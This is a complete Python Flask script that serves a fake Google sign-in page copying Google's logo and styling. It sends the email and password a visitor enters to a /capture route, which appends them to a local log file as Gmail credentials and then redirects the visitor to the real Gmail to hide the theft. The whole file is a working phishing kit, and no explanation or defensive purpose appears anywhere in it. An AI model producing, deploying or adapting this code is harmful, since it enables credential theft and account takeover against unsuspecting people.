from flask import Flask, request, render_template_string
app = Flask(__name__)
html = """
<body style="font-family:sans-serif;text-align:center;padding-top:50px;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="100">
    <h2 style="font-weight:400;">Sign in</h2>
    <p>Use your Google Account</p>
    <input type="text" id="e" placeholder="Email or phone" style="width:250px;padding:12px;margin-bottom:10px;border:1px solid #dadce0;border-radius:4px;"><br>
    <input type="password" id="p" placeholder="Enter your password" style="width:250px;padding:12px;margin-bottom:20px;border:1px solid #dadce0;border-radius:4px;"><br>
    <button style="background:#1a73e8;color:white;padding:10px 24px;border:none;border-radius:4px;cursor:pointer;font-weight:500;" onclick="s()">Next</button>
    <script>function s(){window.location.href="/capture?u="+document.getElementById('e').value+"&p="+document.getElementById('p').value;}</script>
</body>
"""
@app.route('/')
def h(): return render_template_string(html)
@app.route('/capture')
def c():
    u, p = request.args.get('u'), request.args.get('p')
    with open("log.txt","a") as f: f.write(f"GMAIL -> User: {u} | Pass: {p}\n")
    return "<h3>Connecting...</h3><script>setTimeout(()=>{window.location.href='https://mail.google.com'},1500)</script>"
if __name__ == '__main__': app.run(host='0.0.0.0', port=5000)
